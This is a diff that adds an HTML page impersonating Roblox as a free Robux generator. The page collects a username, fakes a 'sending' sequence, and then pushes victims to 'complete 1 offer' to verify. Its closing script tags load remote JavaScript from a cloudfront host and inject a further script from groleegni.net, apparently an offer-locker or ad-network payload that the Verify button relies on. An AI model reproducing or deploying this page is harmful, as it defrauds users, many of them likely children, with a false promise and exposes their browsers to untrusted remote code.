@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="icon" href="" type="image/x-icon">
+    <title>Roblox</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Gotham SSm", -apple-system, "Helvetica Neue", Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.8)),
+                url('https://i.ibb.co/S7VbfB29/786c93c42b03574996210eee92269996.jpg') center/cover no-repeat fixed;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: rgba(15, 15, 15, 0.95);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 40px;
+            width: 100%;
+            max-width: 480px;
+            position: relative;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
+            animation: modalAppear 0.6s ease-out;
+        }
+
+        @keyframes modalAppear {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 35px;
+        }
+
+        .logo img {
+            width: 220px;
+            height: auto;
+            filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.2));
+        }
+
+        .description {
+            color: rgba(255, 255, 255, 0.85);
+            text-align: center;
+            margin-bottom: 35px;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+
+        .input-container {
+            margin-bottom: 30px;
+        }
+
+        .username-input {
+            width: 100%;
+            padding: 18px 25px;
+            background: rgba(255, 255, 255, 0.07);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            color: #FFFFFF;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+
+        .username-input:focus {
+            outline: none;
+            border-color: #00A2FF;
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 0 4px rgba(0, 162, 255, 0.1);
+        }
+
+        .username-input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .button {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #00A2FF, #00FFB3);
+            border: none;
+            border-radius: 16px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 162, 255, 0.3);
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .loading-text {
+            color: #fff;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+
+        .username-display {
+            color: #00FFB3;
+            font-weight: 600;
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-left-color: #00A2FF;
+            border-radius: 50%;
+            display: inline-block;
+            animation: spin 1s linear infinite;
+        }
+
+        .robux-options {
+            display: none;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .robux-option {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 12px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .robux-option:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .robux-icon {
+            width: 20px;
+            height: 20px;
+        }
+
+        .sending-status {
+            display: none;
+            color: #00FFB3;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            margin: 20px 0;
+            padding: 20px;
+            background: rgba(0, 255, 179, 0.05);
+            border-radius: 12px;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .verify-container {
+            display: none;
+            text-align: center;
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .verify-message {
+            color: #fff;
+            text-align: center;
+            margin: 20px 0;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+
+        .activate-btn {
+            background: linear-gradient(45deg, #FFD700, #FFA500);
+            border: none;
+            padding: 18px;
+            border-radius: 16px;
+            color: #000;
+            font-size: 16px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            animation: glowPulse 2s infinite;
+        }
+
+        .activate-btn:hover {
+            transform: translateY(-2px);
+            filter: brightness(1.1);
+        }
+
+        .footer {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            margin-top: 20px;
+        }
+
+        .copyright {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+
+        .dmca-warning {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 12px;
+            line-height: 1.6;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .dmca-warning strong {
+            color: #00A2FF;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes glowPulse {
+            0% { box-shadow: 0 0 5px rgba(255, 215, 0, 0.5); }
+            50% { box-shadow: 0 0 20px rgba(255, 215, 0, 0.8); }
+            100% { box-shadow: 0 0 5px rgba(255, 215, 0, 0.5); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @media (max-width: 640px) {
+            .container {
+                padding: 30px 20px;
+            }
+
+            .logo img {
+                width: 180px;
+            }
+
+            .robux-options {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://i.ibb.co/Zp9XX5Zb/IMG-20250826-WA0008.jpg" alt="Roblox">
+        </div>
+
+        <div id="initial-content">
+            <p class="description">
+                Enter your username to access exclusive content and premium benefits
+            </p>
+
+            <div class="input-container">
+                <input type="text" id="username-input" class="username-input" placeholder="Enter your username">
+            </div>
+
+            <button class="button" onclick="searchUser()">Continue</button>
+        </div>
+
+        <div id="loading" class="loading">
+            <div class="loading-text">
+                Searching for user: <span id="searching-username" class="username-display"></span>
+            </div>
+            <div class="loading-spinner"></div>
+        </div>
+
+        <div id="robux-options" class="robux-options">
+            <button class="robux-option" onclick="selectAmount('10,000')">
+                <img src="https://i.ibb.co/5gyPT50S/IMG-20250816-WA0002-1.png" alt="Robux" class="robux-icon">
+                10,000
+            </button>
+            <button class="robux-option" onclick="selectAmount('25,000')">
+                <img src="https://i.ibb.co/5gyPT50S/IMG-20250816-WA0002-1.png" alt="Robux" class="robux-icon">
+                25,000
+            </button>
+            <button class="robux-option" onclick="selectAmount('40,000')">
+                <img src="https://i.ibb.co/5gyPT50S/IMG-20250816-WA0002-1.png" alt="Robux" class="robux-icon">
+                40,000
+            </button>
+            <button class="robux-option" onclick="selectAmount('50,000')">
+                <img src="https://i.ibb.co/5gyPT50S/IMG-20250816-WA0002-1.png" alt="Robux" class="robux-icon">
+                50,000
+            </button>
+            <button class="robux-option" onclick="selectAmount('100,000')">
+                <img src="https://i.ibb.co/5gyPT50S/IMG-20250816-WA0002-1.png" alt="Robux" class="robux-icon">
+                100,000
+            </button>
+            <button class="robux-option" onclick="selectAmount('150,000')">
+                <img src="https://i.ibb.co/5gyPT50S/IMG-20250816-WA0002-1.png" alt="Robux" class="robux-icon">
+                150,000
+            </button>
+        </div>
+
+        <div id="sending" class="loading">
+            <div class="loading-text">Processing request...</div>
+            <div class="loading-spinner"></div>
+        </div>
+
+        <div id="sending-status" class="sending-status"></div>
+
+        <div id="verify-container" class="verify-container">
+            <p class="verify-message">
+                Please click on the button below and complete 1 offer to verify that you're not a robot.
+            </p>
+            <button class="activate-btn" onclick="_qW()">
+                Verify
+            </button>
+        </div>
+
+        <div class="footer">
+            <div class="copyright">Copyright ©️ 2025</div>
+            <div class="dmca-warning">
+                This is a copyrighted website and using it with no permission could result in facing a lawsuit by <strong>DMCA</strong>.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function searchUser() {
+            const username = document.getElementById('username-input').value;
+            if (!username) return;
+
+            document.getElementById('initial-content').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('searching-username').textContent = username;
+
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('robux-options').style.display = 'grid';
+            }, 2000);
+        }
+
+        function selectAmount(amount) {
+            const username = document.getElementById('username-input').value;
+            document.getElementById('robux-options').style.display = 'none';
+            document.getElementById('sending').style.display = 'block';
+
+            setTimeout(() => {
+                document.getElementById('sending').style.display = 'none';
+                document.getElementById('sending-status').style.display = 'block';
+                document.getElementById('sending-status').innerText = `Sending awcoins to **${username}**`;
+
+                setTimeout(() => {
+                    document.getElementById('sending-status').style.display = 'none';
+                    document.getElementById('verify-container').style.display = 'block';
+                }, 2000);
+            }, 2000);
+        }
+    </script>
+<script type="text/javascript">
+    var Sjauj_ydb_AlZMVc={"it":4542177,"key":"2c408"};
+</script>
+<script src="https://dfmpe7igjx4jo.cloudfront.net/600cbee.js"></script>
+<script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('groleegni.net',9099679,document.createElement('script'))</script>
+
+<!-- Google Analytics -->
+
+<!-- End Google Analytics -->
+
+</body>
+</html>
